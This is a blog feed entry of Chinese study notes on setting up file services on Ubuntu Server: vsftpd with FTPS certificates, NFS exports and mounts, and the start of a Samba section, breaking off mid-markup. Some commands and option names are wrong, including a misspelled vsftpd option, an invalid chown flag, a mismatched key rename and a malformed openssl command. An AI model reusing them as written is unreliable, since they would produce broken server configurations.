<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>偷得浮生半日闲</title>
  
  <subtitle>再偷浮生两吊钱</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.xpshuai.cn/"/>
  <updated>2020-04-14T08:51:16.552Z</updated>
  <id>http://www.xpshuai.cn/</id>
  
  <author>
    <name>浮生</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ubuntu server-文件服务</title>
    <link href="http://www.xpshuai.cn/ubuntu-server-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1/"/>
    <id>http://www.xpshuai.cn/ubuntu-server-文件服务/</id>
    <published>2020-04-14T08:48:09.000Z</published>
    <updated>2020-04-14T08:51:16.552Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件服务"><a href="#文件服务" class="headerlink" title="文件服务"></a>文件服务</h1><blockquote><p>我的就是你的 -  你的还是你的</p></blockquote><p>网络诞生最初的动因是去中心化和资源共享<br>文件是初期最主要的资源共享形式（把文件存放在集中的位置供大家访问）  </p><p>去中心化是另外一个话题</p><ul><li>早期的军事需求</li><li>现在的信任需求</li></ul><h2 id="FTP服务"><a href="#FTP服务" class="headerlink" title="FTP服务"></a><font color="red">FTP服务</font></h2><p>最古老的就是FTP  </p><ul><li>产生于安全出现之前</li><li>明文传输一切</li><li>目前主要用于公开提供的文件下载服务(目前还没消亡)</li><li>使用简单、兼容性好</li><li>还有SFTP、FTPS等</li></ul><h6 id="FTP服务端软件"><a href="#FTP服务端软件" class="headerlink" title="FTP服务端软件"></a>FTP服务端软件</h6><ul><li>Server U</li><li>vsftpd</li><li>Proftpd</li></ul><h6 id="为了安全考虑"><a href="#为了安全考虑" class="headerlink" title="为了安全考虑"></a>为了安全考虑</h6><ul><li>独立部署于企业防火墙之外</li><li>只读挂载存储或采用只读存储设备(CD / DVD)</li></ul><h2 id="vsftp安装和配置和管理"><a href="#vsftp安装和配置和管理" class="headerlink" title="vsftp安装和配置和管理"></a><font color="red">vsftp安装和配置和管理</font></h2><p>vsftpd  –  灵活、安全的FTP服务端软件</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install vsftpd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装过程中生成ftp账号（anonymous） 主目录在：/srv/ftp</span></span><br><span class="line"><span class="comment"># 默认是21端口进行会话</span></span><br></pre></td></tr></table></figure><p>FTP账号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装完之后会自动创建一个ftp账号（这个账号是不能使用shell和登录机器 ）</span></span><br><span class="line">/etc/passwd    <span class="comment"># bin/false   表示不能使用shell</span></span><br><span class="line">/etc/shadow    <span class="comment"># *表示不能使用终端</span></span><br><span class="line">/srv/ftp   <span class="comment"># ftp用户主目录</span></span><br></pre></td></tr></table></figure><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>两种配置模式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">anonymous<span class="comment"># 匿名模式（适用于公开共享文件） -- vsftpd安装好之后是默认禁用匿名登陆的</span></span><br><span class="line">Standard<span class="comment"># 认证模式</span></span><br></pre></td></tr></table></figure><p>常见FTP客户端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用哪个账号登录，看到的文件就是哪个用户的主目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.使用命令行连接ftp服务器</span></span><br><span class="line">ftp 192.168.1.130</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.浏览器</span></span><br><span class="line">ftp://192.168.111.130</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.ftp客户端访问程序（FileZilla）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.文件同步客户端软件</span></span><br></pre></td></tr></table></figure><h5 id="1-匿名登录"><a href="#1-匿名登录" class="headerlink" title="1.匿名登录"></a>1.匿名登录</h5><p>配置文件位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/vsftpd.conf    <span class="comment"># 主配置文件</span></span><br></pre></td></tr></table></figure><p><strong>开启匿名模式</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/vsftpd.conf </span><br><span class="line"><span class="comment"># 修改内容为</span></span><br><span class="line">anonymous_enable=YES<span class="comment"># 启用匿名账号登录</span></span><br><span class="line">local_enable=NO<span class="comment"># 禁用认证用户登录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启vsftpd服务，检查状态</span></span><br><span class="line"></span><br><span class="line">然后使用账号anonymous登录(命令行需要,其他方式不用)，密码不用输即可()</span><br><span class="line">看到的目录是`/srv/ftp/`</span><br></pre></td></tr></table></figure><p><strong>开启匿名账号上传</strong><br>默认：匿名账号是不允许匿名上传的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/vsftpd.conf </span><br><span class="line"><span class="comment"># 修改内容</span></span><br><span class="line">write_enable=YES<span class="comment"># 全局设置（以下配置生效的依赖）</span></span><br><span class="line">anon_upload_enable=YES<span class="comment"># 允许匿名上传文件</span></span><br><span class="line">anon_mkdir_write_enable=YES<span class="comment"># 允许匿名创建目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务，检查状态</span></span><br><span class="line">sudo systemctl restart vsftpd.service</span><br><span class="line"></span><br><span class="line">但是还是不能上传的（因为vsftpd强制禁止在根目录下匿名上传）</span><br><span class="line">Note： ftp的主目录是不能进行上传文件的，因为这个目录对同组用户没有写的权限(`ls -ld`查看当前目录的权限)，就算你chmod修改了权限也是不行的</span><br><span class="line">【解决办法】:在根目录新建文件然后上传</span><br><span class="line">sudo mkdir /srv/ftp/upload  <span class="comment"># 创建上传目录</span></span><br><span class="line">sudo chown ftp:ftp /srv/ftp/upload <span class="comment"># 配置新建文件系统属主数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 继续新增配置  /etc/vsftpd.conf </span></span><br><span class="line">anon_umask=022  <span class="comment"># 上传文件权限掩码(让上传的文件配置不同的权限 -- 看自己需要来配置)</span></span><br><span class="line">anon_other_wrote_enable=YES<span class="comment"># 允许删除和重命名(否则删除不了也无法重命名)</span></span><br></pre></td></tr></table></figure><p><strong>修改FTP主目录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /srv/files/ftp</span><br><span class="line">sudo chown -d /srv/files/ftp ftp</span><br></pre></td></tr></table></figure><p><strong>文件传输日志</strong><br>默认是开启的，可以查看恶意文件上传记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/vsftpd.conf </span></span><br><span class="line"></span><br><span class="line">xferlog_enable=YES<span class="comment"># 默认开启</span></span><br><span class="line">xferlog_file=/var/<span class="built_in">log</span>/vsftpd.log  <span class="comment"># 默认日志存放位置(注释不注释他都默认往里面写，可修改)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果修改，重启服务</span></span><br></pre></td></tr></table></figure><p><strong>其他配置</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">idle_session_timeout=600<span class="comment"># 会话超时时长</span></span><br><span class="line">no_anon_password=YES<span class="comment"># 命令行登录禁用密码提示</span></span><br><span class="line">hide_ids=YES<span class="comment"># 显示属主/数组名称，而不显示uid和gid(uid会比较敏感)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br></pre></td></tr></table></figure><p><strong>端口</strong></p><ul><li>会话指令 -&gt; TCP  21端口       </li><li>数据传输模式<ul><li>主动模式（受客户端防火墙影响）– 客户端随机产生一个端口，告诉服务器  -&gt;服务端只使用 20端口        </li><li>被动模式 （兼容性好，建议使用）         – 服务端告诉客户端使用哪个端口传输</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用什么模式，客户端说了算</span></span><br><span class="line"><span class="comment"># 都是客户端随机产生一个端口，告诉服务端</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 被动模式连接</span></span><br><span class="line">ftp -p 192.168.0.130</span><br></pre></td></tr></table></figure><p><img src="/ubuntu-server-文件服务/20200413153011895_32240.png" alt></p><p>限定<code>被动模式</code>数据通信端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/vsftpd.conf   新增配置</span></span><br><span class="line"><span class="comment"># 开放一个端口的范围(尽量少开) </span></span><br><span class="line">pasv_min_port=40001</span><br><span class="line">pasv_max_port=40101</span><br></pre></td></tr></table></figure><p>然后在服务器端边界防火墙上开放上述100个端口</p><h5 id="2-身份认证登录"><a href="#2-身份认证登录" class="headerlink" title="2.身份认证登录"></a>2.身份认证登录</h5><p><strong>身份认证登录TFP</strong></p><ul><li>安装之后的默认配置</li><li>不能上传</li><li>可回溯到根目录（<code>存在安全隐患!!!</code> –&gt; 使用chroot来解决）</li></ul><p><strong>chroot</strong><br>chroot 将<code>所有</code>登录用户锁定在自己的主目录里（防止目录回溯）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置文件 sudo vim /etc/vsftpd.conf</span></span><br><span class="line"><span class="comment"># 全局的配置参数(对所有用户)</span></span><br><span class="line">chroot_local_user=YES   <span class="comment"># 但是chroot的根目录不能是可写的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认主目录可写， 但是chroot的根目录不能是可写的，vsftp的禁止用户登录，好猫短   ————&gt; 怎么办呢？看下面</span></span><br></pre></td></tr></table></figure><p><strong>（接上文）两种解决办法:</strong><br>1.为FTP登录指定新的主目录（建议使用）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir ~/ftp &amp;&amp; chmod -w ftp    <span class="comment"># 新建主目录，并删除写入权限</span></span><br><span class="line"><span class="comment"># sudo vim /etc/vsftpd.conf</span></span><br><span class="line">local_root=/home/xps/ftp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端只能看到这个目录里面，跳不出去</span></span><br></pre></td></tr></table></figure><p>2.允许根目录写入（不建议，存在安全风险）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置文件 sudo vim /etc/vsftpd.conf</span></span><br><span class="line">write_enable=YES</span><br><span class="line">local_root=/home/xps</span><br><span class="line">allow_writeable_chroot=YES</span><br></pre></td></tr></table></figure><p><strong>chroot 将<code>指定</code>登录用户锁定在自己的主目录里（防止目录回溯）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置文件 sudo vim /etc/vsftpd.conf</span></span><br><span class="line"><span class="comment"># chroot_local_user=YES   # 注释掉前面配置的全局的配置项</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用用户列表功能</span></span><br><span class="line">chroot_list_enable=YES  <span class="comment"># 如果chroot_local_user=YES也开启了，就起了相反的作用(除了指定列表里面的用户之外, 都锁定在主目录里)</span></span><br><span class="line"><span class="comment"># 指定用户列表文件</span></span><br><span class="line">chroot_list_file=/etc/vsftpd.chroot_list</span><br><span class="line"><span class="comment"># 编辑用户账号列表</span></span><br><span class="line">vim /etc/vsftpd.chroot_list</span><br><span class="line"><span class="comment"># 添加用户</span></span><br><span class="line">xps</span><br><span class="line">ftp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br></pre></td></tr></table></figure><p>禁止指定FTP登录账号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/ftpusers  <span class="comment"># 默认禁止FTP登录账号(将用户加入进去)</span></span><br></pre></td></tr></table></figure><p><strong>上传文件权限掩码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 跟匿名用户的配置是类似的</span></span><br><span class="line">local_umask=022</span><br></pre></td></tr></table></figure><p><strong>文件同步客户端</strong><br>自动把我电脑的新的文件，上传到FTP服务器(类似于备份) – 有一些第三方软件(ubuntu自带的同步软件<code>backup</code>等)</p><h2 id="FTP安全"><a href="#FTP安全" class="headerlink" title="FTP安全"></a><font color="red">FTP安全</font></h2><h6 id="1-FTPS-FTP-over-Secure-Socket-Layer-SSL"><a href="#1-FTPS-FTP-over-Secure-Socket-Layer-SSL" class="headerlink" title="1.FTPS: FTP over Secure Socket Layer(SSL)"></a>1.<code>FTPS</code>: FTP over Secure Socket Layer(SSL)</h6><blockquote><p>账号无需shell登录权限  </p></blockquote><p>基于证书的加密</p><p>开启FTPS：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安全性--指的是在数据传输过程中不会被别人嗅探</span></span><br><span class="line">ssl_enable=YES<span class="comment"># 启动FTPS</span></span><br><span class="line">rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem   <span class="comment"># 公钥</span></span><br><span class="line">rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key  <span class="comment"># 私钥</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line"><span class="comment"># 然后再连接的时候就是加密的了(浏览器需要ftps://ip)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 怎么加密的呢?</span></span><br><span class="line"><span class="comment"># 简单来说：安装FTP时候默认会生成一对公钥和私钥</span></span><br><span class="line"><span class="comment"># 不建议使用安装FTP时候默认生成的证书，建议手动生成(每个应用一个证书, 每个证书有效期一两年)</span></span><br></pre></td></tr></table></figure><p><strong>手动生成证书 –&gt; 替换默认证书(安全考虑)：</strong><br>1.生成秘钥文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用ssl的一个开源组件openssl</span></span><br><span class="line">openssl genrsa -des3 -out ftp.key 4096  <span class="comment"># 1024的已经不安全了</span></span><br><span class="line"><span class="comment"># 然后设置密码保护</span></span><br></pre></td></tr></table></figure><p>2.生成不加密的秘钥文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先还原为明文的密钥对</span></span><br><span class="line">openssl rsa -<span class="keyword">in</span> ftp.key -out ftp.key.insecure  <span class="comment"># 用完就删掉这个insecure文件</span></span><br><span class="line"><span class="comment"># 改名(这是加密的)</span></span><br><span class="line">mv ftp.key  server.key.secure </span><br><span class="line"><span class="comment"># 改名(这是明文的)</span></span><br><span class="line">mv server.key.insecure  ftp.key</span><br></pre></td></tr></table></figure><p>3.生成证书请求文件(使用上面的明文秘钥)   – 实验使用的自签名证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -key ftp.key -out ftp.csr</span><br><span class="line"><span class="comment"># 然后输入一些证书的信息</span></span><br></pre></td></tr></table></figure><p>这里使用自签名证书(生产环境建议由证书颁发机构前面生成证书)<br>3.生成自签名证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -req -days 365 -<span class="keyword">in</span> ftp.csr -signkey ftp.key -out ftp.pem   <span class="comment"># -days 365有效期</span></span><br></pre></td></tr></table></figure><p>4.部署证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ftp.key放到一个更安全的目录去</span></span><br><span class="line">sudo cp ftp.key /etc/ssl/private/  <span class="comment"># 此目录root才能看</span></span><br><span class="line">sudo cp ftp.pem /etc/ssl/certs/</span><br></pre></td></tr></table></figure><p>5.修改<code>/etc/vsftpd.cong</code>中的key和公钥为刚才手动生成的证书， 然后重启服务</p><p>上面的操作也可以合并为一条命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -req -node -days 365 -newkey rsa:4096 -keyout /etc/ssl/private/vsftpd.key -out /etc/ssl/private/vsftpd.pem</span><br></pre></td></tr></table></figure><h6 id="2-SFTP-基于SSH加密隧道传输文件"><a href="#2-SFTP-基于SSH加密隧道传输文件" class="headerlink" title="2.SFTP: 基于SSH加密隧道传输文件"></a>2.<code>SFTP</code>: 基于SSH加密隧道传输文件</h6><blockquote><p>账号需要shell登录权限（可设置禁止权限）</p></blockquote><p>远程登录那一章已经学了</p><h2 id="NFS服务"><a href="#NFS服务" class="headerlink" title="NFS服务"></a><font color="red">NFS服务</font></h2><blockquote><p>适用于类UNIX系统</p></blockquote><ul><li>NFS – Network File System</li><li>最早由SUN公司开发</li><li>类unix平台最主要的文件共享方法</li><li>基于RPC(Remote Procedure Call)协议<ul><li>NFS是一个RPC Server （v3 、v4）</li></ul></li><li>协议本身不加密，可结合SSH，Kerberos实现加密</li><li>隐藏式身份验证（难点）</li><li>权限配置是关键</li><li>服务端口: TCP <code>2049</code></li></ul><p><strong>安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nfs-kernel-server  <span class="comment"># 服务端</span></span><br><span class="line">sudo apt-get install nfs-common<span class="comment"># 客户端</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装完，服务已经都启动了</span></span><br><span class="line">ps -ef |grep rpc</span><br><span class="line">ps -ef |grep nfs</span><br></pre></td></tr></table></figure><p><strong>进程</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rpcbind<span class="comment"># RPC服务进程</span></span><br><span class="line">nfsd<span class="comment"># NFS主进程(身份识别)</span></span><br><span class="line">mountd<span class="comment"># 根据 /etc/exports 配置验证权限</span></span><br><span class="line">lockd<span class="comment"># 锁定（需C/S同时启用）</span></span><br><span class="line">statd<span class="comment"># 一致性（需C/S同时启用）</span></span><br></pre></td></tr></table></figure><p><strong>身份识别</strong></p><ul><li>客户端提供 UID / GID (与用户名、组名无关)</li><li>服务器按客户端UID /GID 赋权</li><li>若服务器无客户端UID / GID账号，则将客户端映射为匿名账号<ul><li>nobody / nogroup (uid: 65534)</li></ul></li><li>客户端使用root账号（UID 0），默认映射为匿名账号<ul><li>可修改配置文件映射 UID 0 为服务端 ROOT （存在安全隐患）</li></ul></li></ul><blockquote><p>如果客户端uid和服务端uid相同，则客户端会获得服务器端账号的权限；若不同，则客户端获取服务端的nobody权限(除非客户端是root账号,且服务端启用了客户端的root映射为服务端的root)</p></blockquote><p>隐式的身份认证</p><p><strong>权限体系</strong></p><ul><li>1.共享权限</li><li>2.文件系统权限</li></ul><p><strong>配置</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/exports<span class="comment"># 主配置文件</span></span><br><span class="line"><span class="comment"># 内容：共享目录,谁可以访问我, 权限，(sync是数据先写到内存在硬盘可靠,async是写到内存然后写的硬盘速度快)，no_subtree_check是不进行子目录的检查(建议使用)</span></span><br><span class="line">/exports/public192.168.1.0/24(rw,sync,no_subtree_check)  <span class="comment"># 允许访问的范围可以使用通配符： *.lab.com</span></span><br><span class="line">no_root_squash<span class="comment"># 禁用root默认映射为nobody(加在上面括号中的配置中)</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">sudo mkdir -p /exports/public<span class="comment"># 创建共享目录</span></span><br><span class="line">sudo chown nobody:nogroup /exports/public<span class="comment"># 设置权限</span></span><br><span class="line">sudo systemctl restart nfs-kernel-server<span class="comment"># 重启服务</span></span><br><span class="line"></span><br><span class="line">sudo exportfs<span class="comment"># 查看共享目录</span></span><br><span class="line">cat /var/lib/nfs/etab<span class="comment"># 共享目录</span></span><br><span class="line">cat /var/lib/nfs/xtab<span class="comment"># 客户端信息</span></span><br></pre></td></tr></table></figure><p><strong>共享权限</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ro/rw<span class="comment"># 只读/只写</span></span><br><span class="line">sync / async<span class="comment"># 同步写入硬盘 / 暂存于内存中</span></span><br><span class="line">all_squash<span class="comment"># 所有用户全部映射为nobody</span></span><br><span class="line">anonuid / anongid<span class="comment"># 支付那个匿名ID（默认65534）</span></span><br><span class="line">secure / insecure<span class="comment"># 使用1024以下/以上端口</span></span><br><span class="line">hide / no_hide<span class="comment"># 共享 / 不共享NFS子目录</span></span><br></pre></td></tr></table></figure><p><strong>客户端挂载</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 和本地挂载设备一样(挂载到本地，但是访问是通过网络流量的)</span></span><br><span class="line">sudo mount 192.168.0.30:/<span class="built_in">export</span>/publicmy_nfs/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入文件的话</span></span><br><span class="line">1.临时获取root权限，会默认转为nobody</span><br><span class="line">sudo xxxxx </span><br><span class="line">2.</span><br><span class="line">chmod修改其他用户的权限后，直接写入即可(客户端的uid与服务端的uid相同的话)</span><br></pre></td></tr></table></figure><p><strong>启动挂载</strong><br>风险：nfs服务器如果出现问题，本地机器启动就会特别慢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/fstab</span></span><br><span class="line">192.168.1.30:/home/my_nfs/nfs no_auto,nofail,noatime,nolock,intr,tcp,actimeo=1800 0 0  <span class="comment"># 建议 no_auto 不自动挂载</span></span><br></pre></td></tr></table></figure><p><strong>其他命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rpcinfo -p 192.168.1.30  <span class="comment"># 查询RPC服务注册状态(客户端与服务端都可以执行)</span></span><br><span class="line">tail /var/<span class="built_in">log</span>/kern.log <span class="comment"># 服务器日志</span></span><br><span class="line">showmount -e localhost <span class="comment"># 显示共享目录</span></span><br><span class="line">df -h <span class="comment"># 客户端查看挂载</span></span><br></pre></td></tr></table></figure><p><strong>企业环境有统一域名和身份验证时</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 也要配置这个</span></span><br><span class="line">sudo vim /etc/idpamd.conf</span><br><span class="line">Domain = lab.com</span><br></pre></td></tr></table></figure><p><strong>Windows客户端</strong><br>企业版才可以添加nfs的支持</p><h2 id="SAMBA服务"><a href="#SAMBA服务" class="headerlink" title="SAMBA服务"></a><font color="red">SAMBA服务</font></h2><p><strong>SMB / CIFS 协议</strong></p><ul><li>全称Server message block / Common internet file system</li><li>最早由IBM研发，后由微软采用并不断完善</li><li>Windows文件和打印共享（之前使用的SMB协议, 后来改进为cifs协议）</li><li>端口：TCP 139(局域网), 445() / UDP 137(用来名称解析),  138</li><li>Samba 是开源世界逆向了SMB协议后打造的兼容微软SMB的文件共享服务</li><li>Samba还有其他功能、用途和使用场景</li></ul><p><strong>功能不仅限于此，但最常用的用途，还是做文件共享服务：</strong></p><ul><li>NFS只适用于类Unix系统环境</li><li>Samba适用与Windows、Linux混合环境的文件共享需要</li></ul><p><strong>Samba实现了CIFS服务的四个基本功能</strong><br>1.文件和打印共享<br>2.认证和授权<br>3.名称解析<br>4.服务宣告(browsing)</p><p><strong>传输协议：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NetBIOS<span class="comment"># 局域网</span></span><br><span class="line">NetBIOS over TCP/IP<span class="comment"># 跨网段(把NetBIOS数据包封装之后跨网络传输)</span></span><br></pre></td></tr></table></figure><p><strong>后台进程</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Smbd<span class="comment"># 文件共享主进程 TCP: 139/445</span></span><br><span class="line">Nmbd<span class="comment"># WINS通信、名称解析 UDP: 137/138</span></span><br><span class="line">Winbindd<span class="comment"># 同步系统账号(把Linux系统的账户拷到samba的用户数据库中进行处理)</span></span><br><span class="line">其他10多个进程</span><br></pre></td></tr></table></figure><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install samba libpam-winbind</span><br></pre></td></tr></table></figure><h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><p>配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/samba/dhcp.conf<span class="comment"># 指定WINS服务器（跨网段时候用）</span></span><br><span class="line">/etc/samba/smb.conf<span class="comment"># 主配置文件</span></span><br></pre></td></tr></table></figure><h6 id="一-配置验证用户名的Samba服务"><a href="#一-配置验证用户名的Samba服务" class="headerlink" title="一. 配置验证用户名的Samba服务"></a>一. 配置验证用户名的Samba服务</h6><p>1.配置文件/etc/samba/smb.conf    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 